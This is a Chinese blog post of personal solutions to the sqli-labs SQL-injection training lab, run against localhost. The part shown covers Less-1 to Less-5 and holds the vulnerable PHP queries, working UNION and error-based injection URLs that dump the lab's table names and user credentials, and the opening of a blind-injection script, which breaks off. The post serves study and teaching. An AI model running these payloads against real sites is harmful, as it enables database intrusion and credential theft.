
 <!DOCTYPE HTML>
<html lang="cn-zh">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  
    <title>sqli-labs刷题笔记 | flag0&#39;s Blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="flag0">
    

    
    <meta name="description" content="国庆假期把sqli-labs刷完了,感觉收获很大">
<meta name="keywords" content="sqli-labs,sql注入">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-labs刷题笔记">
<meta property="og:url" content="http://flag0.com/2019/10/05/sqli-lib/index.html">
<meta property="og:site_name" content="flag0&#39;s Blog">
<meta property="og:description" content="国庆假期把sqli-labs刷完了,感觉收获很大">
<meta property="og:locale" content="cn-zh">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570240504458.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570240840748.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570241269081.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570241395722.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570241660067.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570241747631.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570242076248.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570242028313.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570242362924.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570244737713.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569638431081.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569639299895.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569640299552.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569655471946.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569655348036.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569655554750.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569656527217.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569659136073.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569662816661.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569665868740.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569671577125.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569678881553.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682071722.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682154543.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682188367.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682235978.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682301399.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682353061.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682364943.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569682966804.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569754661270.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569754693979.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569755185509.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569755242956.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569755509836.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569756263899.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569756349210.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569756526964.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569760862744.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569762392006.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569762538849.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569832174245.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569832463246.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569833017930.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569833128483.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569833215648.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569833303284.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569835123748.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569835896664.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569836717631.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569887583719.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569887811502.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569888112247.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569891463061.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569891540073.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569891861510.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569892563886.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569892746816.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569893436277.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569893766926.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569895589260.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569895536153.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569895725146.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569911240212.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569926349639.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569919152049.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569920880677.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569930454686.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569930631701.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569931479448.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569981227704.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569981358720.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569981465235.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569981516255.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569982565942.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569983390408.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569983736299.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569985183435.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1569985255015.png">
<meta property="og:image" content="http://flag0.com/img/images/sqli-lib/1570206509430.png">
<meta property="og:updated_time" content="2019-10-05T03:22:35.826Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="sqli-labs刷题笔记">
<meta name="twitter:description" content="国庆假期把sqli-labs刷完了,感觉收获很大">
<meta name="twitter:image" content="http://flag0.com/img/images/sqli-lib/1570240504458.png">

    
    <link rel="alternative" href="/atom.xml" title="flag0&#39;s Blog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="flag0&#39;s Blog">flag0&#39;s Blog</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:flag0.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2019/10/05/sqli-lib/" title="sqli-labs刷题笔记" itemprop="url">sqli-labs刷题笔记</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="flag0" target="_blank" itemprop="author">flag0</a>
		
  <p class="article-time">
    <time datetime="2019-10-05T03:20:40.000Z" itemprop="datePublished"> 发表于 2019-10-05</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">文章目录</strong>
		
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-union"><span class="toc-number">1.</span> <span class="toc-text">Less-1 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-2-union"><span class="toc-number">2.</span> <span class="toc-text">Less-2 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-3-union"><span class="toc-number">3.</span> <span class="toc-text">Less-3 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-4-union"><span class="toc-number">4.</span> <span class="toc-text">Less-4 union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5"><span class="toc-number">5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6"><span class="toc-number">6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-7"><span class="toc-number">7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-8"><span class="toc-number">8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-9"><span class="toc-number">9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10"><span class="toc-number">10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11-login-inject"><span class="toc-number">11.</span> <span class="toc-text">Less-11 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-12-login-inject"><span class="toc-number">12.</span> <span class="toc-text">Less-12 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-13-login-inject"><span class="toc-number">13.</span> <span class="toc-text">Less-13 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-14-login-inject"><span class="toc-number">14.</span> <span class="toc-text">Less-14 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-15-login-inject"><span class="toc-number">15.</span> <span class="toc-text">Less-15 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-16-login-inject"><span class="toc-number">16.</span> <span class="toc-text">Less-16 login inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-17-update"><span class="toc-number">17.</span> <span class="toc-text">Less-17 update</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-18-insert"><span class="toc-number">18.</span> <span class="toc-text">Less-18 insert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-19-insert"><span class="toc-number">19.</span> <span class="toc-text">Less-19 insert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-20-cookie"><span class="toc-number">20.</span> <span class="toc-text">Less-20 cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-cookie"><span class="toc-number">21.</span> <span class="toc-text">Less-21 cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-22-cookie"><span class="toc-number">22.</span> <span class="toc-text">Less-22 cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-23"><span class="toc-number">23.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-24-二次注入"><span class="toc-number">24.</span> <span class="toc-text">Less-24 二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-25"><span class="toc-number">25.</span> <span class="toc-text">Less-25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-26"><span class="toc-number">26.</span> <span class="toc-text">Less-26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-27"><span class="toc-number">27.</span> <span class="toc-text">Less-27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-28"><span class="toc-number">28.</span> <span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-29"><span class="toc-number">29.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-30"><span class="toc-number">30.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-31"><span class="toc-number">31.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-32"><span class="toc-number">32.</span> <span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-33"><span class="toc-number">33.</span> <span class="toc-text">Less-33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-34"><span class="toc-number">34.</span> <span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-35"><span class="toc-number">35.</span> <span class="toc-text">Less-35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-36"><span class="toc-number">36.</span> <span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-37"><span class="toc-number">37.</span> <span class="toc-text">Less-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-38-Stacked-injection"><span class="toc-number">38.</span> <span class="toc-text">Less-38 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-39-Stacked-injection"><span class="toc-number">39.</span> <span class="toc-text">Less-39 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-40-Stacked-injection"><span class="toc-number">40.</span> <span class="toc-text">Less-40 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-41-Stacked-injection"><span class="toc-number">41.</span> <span class="toc-text">Less-41 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-42-Stacked-injection"><span class="toc-number">42.</span> <span class="toc-text">Less-42 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-43-Stacked-injection"><span class="toc-number">43.</span> <span class="toc-text">Less-43 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-44-Stacked-injection"><span class="toc-number">44.</span> <span class="toc-text">Less-44 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-45-Stacked-injection"><span class="toc-number">45.</span> <span class="toc-text">Less-45 Stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-46-order-by-后的注入"><span class="toc-number">46.</span> <span class="toc-text">Less-46 order by 后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-47-order-by-后的注入"><span class="toc-number">47.</span> <span class="toc-text">Less-47 order by 后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-48-order-by后的注入"><span class="toc-number">48.</span> <span class="toc-text">Less-48 order by后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-49-order-by后的注入"><span class="toc-number">49.</span> <span class="toc-text">Less-49 order by后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-50-order-by-stacked-injection"><span class="toc-number">50.</span> <span class="toc-text">Less-50 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-51-order-by-stacked-injection"><span class="toc-number">51.</span> <span class="toc-text">Less-51 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-52-order-by-stacked-injection"><span class="toc-number">52.</span> <span class="toc-text">Less-52 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-53-order-by-stacked-injection"><span class="toc-number">53.</span> <span class="toc-text">Less-53 order by stacked injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-54"><span class="toc-number">54.</span> <span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-55"><span class="toc-number">55.</span> <span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-56"><span class="toc-number">56.</span> <span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-57"><span class="toc-number">57.</span> <span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-58"><span class="toc-number">58.</span> <span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-59"><span class="toc-number">59.</span> <span class="toc-text">Less-59</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-60"><span class="toc-number">60.</span> <span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-61"><span class="toc-number">61.</span> <span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-62"><span class="toc-number">62.</span> <span class="toc-text">Less-62</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-63"><span class="toc-number">63.</span> <span class="toc-text">Less-63</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-64"><span class="toc-number">64.</span> <span class="toc-text">Less-64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-65"><span class="toc-number">65.</span> <span class="toc-text">Less-65</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">66.</span> <span class="toc-text">参考资料</span></a></li></ol>
		
		</div>
		
		<p>国庆假期把sqli-labs刷完了,感觉收获很大</p>
<a id="more"></a>
<h2 id="Less-1-union"><a href="#Less-1-union" class="headerlink" title="Less-1 union"></a>Less-1 union</h2><p><a href="http://localhost/sqli-labs/Less-1/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=1</a><br><strong>sql语句</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p>
<p><strong>table_name</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=1&apos; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()  --+</span><br></pre></td></tr></table></figure>
<p>Your Login name:emails,referers,uagents,users</p>
<p><strong>column_name</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=1&apos; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name = &apos;users&apos; --+</span><br></pre></td></tr></table></figure></p>
<p>Your Login name:id,username,password</p>
<p><strong>data</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=1&apos; and 1=2 union select 1,group_concat(id,&apos;:&apos;,username,&apos;:&apos;,password,&apos; &apos;),3 from users --+</span><br></pre></td></tr></table></figure>
<p>Your Login name:1:Dumb:Dumb ,2:Angelina:I-kill-you ,3:Dummy:p@ssword ,4:secure:crappy ,5:stupid:stupidity ,6:superman:genious ,7:batman:mob!le ,8:admin:admin ,9:admin1:admin1 ,10:admin2:admin2 ,11:admin3:admin3 ,12:dhakkan:dumbo ,14:admin4:admin4 </p>
<h2 id="Less-2-union"><a href="#Less-2-union" class="headerlink" title="Less-2 union"></a>Less-2 union</h2><p><a href="http://localhost/sqli-labs/Less-2/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/?id=1</a></p>
<p><strong>sql</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p>
<p><strong>payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=1 and 1=2  union select 1,group_concat(id,&quot;:&quot;,username,&quot;:&quot;,password,&quot; &quot;),3 from users--+</span><br></pre></td></tr></table></figure></p>
<h2 id="Less-3-union"><a href="#Less-3-union" class="headerlink" title="Less-3 union"></a>Less-3 union</h2><p><strong>sql</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p><strong>payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-3/?id=1&apos;) and 1=2 union select 1,group_concat(id,&quot;:&quot;,username,&quot;:&quot;,password,&quot; &quot;),3 from users--+</span><br></pre></td></tr></table></figure></p>
<h2 id="Less-4-union"><a href="#Less-4-union" class="headerlink" title="Less-4 union"></a>Less-4 union</h2><p><strong>sql</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p>
<p><strong>payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-4/?id=1&quot;) and 1=2 union select 1,group_concat(id,&quot;:&quot;,username,&quot;:&quot;,password,&quot; &quot;),3  from users--+</span><br></pre></td></tr></table></figure></p>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-5/?id=-1&apos; or updatexml(0,concat(0x7e,(select group_concat(id,username,password) from users)),1)%23</span><br></pre></td></tr></table></figure>
<p>基于布尔的盲注，这里贴上二分法盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span 